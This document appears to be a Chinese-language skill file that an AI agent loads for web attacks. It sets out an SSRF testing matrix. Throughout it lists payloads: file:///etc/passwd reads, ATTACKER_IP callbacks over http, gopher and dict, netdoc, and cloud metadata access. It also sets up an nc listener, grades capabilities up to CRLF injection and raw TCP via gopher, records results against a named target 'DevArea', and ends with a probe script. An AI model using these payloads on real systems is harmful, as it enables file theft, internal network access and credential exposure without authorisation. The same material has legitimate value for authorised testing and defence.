---
name: 'ssrf-protocol-matrix'
description: 'SSRF 协议测试矩阵：file/http/netdoc/gopher 逐个试 → 能力分级 L1-L6 → 关键问题检查表'
metadata: { domain: web, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# SSRF 协议测试矩阵

> 每次发现 SSRF 必须做的标准动作

## 1. 支持协议探测

```bash
# 用外部服务器监听 + 逐个协议试
nc -lvnp 9999

# 测试列表（按优先级）
file:///etc/passwd          # 本地文件读取 — Linux
file:///C:/Windows/win.ini  # 本地文件读取 — Windows
http://ATTACKER_IP:9999/    # 外网 HTTP 请求
https://ATTACKER_IP:9999/   # HTTPS
gopher://ATTACKER_IP:9999/_ # Gopher — 可构造任意 TCP 包
netdoc:///etc/passwd        # Java netdoc — 同 file://
dict://ATTACKER_IP:9999/    # Dict 协议
jar://                      # Java JAR — 可能远程加载类
ftp://                       # FTP — 可能读取/写入
```

## 2. SSRF 能力分级

| 等级 | 能力 | 判定方法 |
|------|------|---------|
| L1 | 读文件 | `file:///etc/passwd` 返回内容 |
| L2 | 读目录 | `file:///etc/`（末尾 `/`）返回文件列表 |
| L3 | HTTP 外网 | `http://AttackerIP/` 收到回调 |
| L4 | HTTP 内网 | `http://127.0.0.1:PORT/` 返回内容 |
| L5 | CRLF 注入 | `http://AttackerIP/%0d%0aInjected:yes` — 注意 Java 会 URL 编码 CRLF |
| L6 | Gopher | `gopher://AttackerIP/_DATA` 发送原始 TCP |

## 3. 每个协议的关键问题

```
[ ] file:// → 能读哪些文件？（用户的 home？/etc？root-owned？）
[ ] file:// → 能列目录吗？（末尾 /）
[ ] http:// → 能出外网吗？（AttackerIP 收到回调？）
[ ] http:// → 能访问 localhost 吗？（127.0.0.1:PORT）
[ ] http:// → 能访问云 metadata 吗？（169.254.169.254）
[ ] http:// → 支持 POST/PUT 吗？（通常不支持）
[ ] http:// → 能设置 Cookie/Header 吗？（通常不能）
[ ] http:// → 跟随重定向吗？（Java URLConnection 默认跟随）
[ ] gopher:// → 可用吗？（构造任意 TCP 流的关键）
[ ] ftp:// → 支持上传吗？（通常不支持 STOR）
```

## 4. DevArea 实测结果

| 协议 | 结果 | 备注 |
|------|------|------|
| `file://` | ✅ 读文件/目录 | 可读 world-readable 文件，可列目录 |
| `http://` | ✅ 内外网均可 | 仅 GET，不跟随重定向（？），不传 Cookie |
| `netdoc://` | ✅ 同 file:// | Java 特有 |
| `gopher://` | ❌ unknown protocol | CXF 不支持 |
| `data://` | ❌ | CXF 不支持 |
| `jar://` | ❌ 无返回 | 可能不支持或文件不存在 |

## 5. 快速模板

```python
# SSRF 协议探测脚本
PROTOCOLS = [
    ("file:///etc/passwd", "File read"),
    ("file:///etc/", "Dir listing"),
    ("http://ATTACKER:9999/test", "HTTP outbound"),
    ("http://127.0.0.1:80/", "HTTP internal"),
    ("gopher://ATTACKER:9999/_test", "Gopher"),
]
for url, desc in PROTOCOLS:
    trigger_ssrf(url)
    print(f"{desc}: check listener")
```
